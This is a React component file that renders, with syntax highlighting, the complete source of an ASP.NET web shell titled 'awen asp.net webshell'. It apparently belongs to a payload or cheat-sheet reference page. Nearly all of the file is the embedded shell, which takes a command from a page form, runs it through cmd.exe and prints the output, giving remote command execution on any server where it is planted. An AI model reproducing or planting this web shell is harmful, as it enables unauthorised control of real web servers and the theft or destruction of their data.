import React from 'react'
import pretty from 'pretty';
import SyntaxHighlighter from 'react-syntax-highlighter';
import { vs2015 } from 'react-syntax-highlighter/dist/esm/styles/hljs';

const ASP = () => {

    const ASP_WebShell = `<%@ Page Language="C#" Debug="true" Trace="false" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%@ Import Namespace="System.IO" %>
  <script Language="c#" runat="server">
  void Page_Load(object sender, EventArgs e)
  {
  }
  string ExcuteCmd(string arg)
  {
  ProcessStartInfo psi = new ProcessStartInfo();
  psi.FileName = "cmd.exe";
  psi.Arguments = "/c "+arg;
  psi.RedirectStandardOutput = true;
  psi.UseShellExecute = false;
  Process p = Process.Start(psi);
  StreamReader stmrdr = p.StandardOutput;
  string s = stmrdr.ReadToEnd();
  stmrdr.Close();
  return s;
  }
  void cmdExe_Click(object sender, System.EventArgs e)
  {
  Response.Write("<pre>");
  Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
  Response.Write("</pre>");
  }
  </script>
  <HTML>
  <HEAD>
  <title>awen asp.net webshell</title>
  </HEAD>
  <body >
  <form id="cmd" method="post" runat="server">
  <asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
  <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="execute" OnClick="cmdExe_Click"></asp:Button>
  <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
  </form>
  </body>
  </HTML>
  `


    return (
        //TODO: Finish layout of ASPX
        <>
            <div>ASPX</div>
            <SyntaxHighlighter language='aspx' style={vs2015} showLineNumbers={true}>
                {pretty( ASP_WebShell )}
            </SyntaxHighlighter>

        </>
    )
}

export default ASP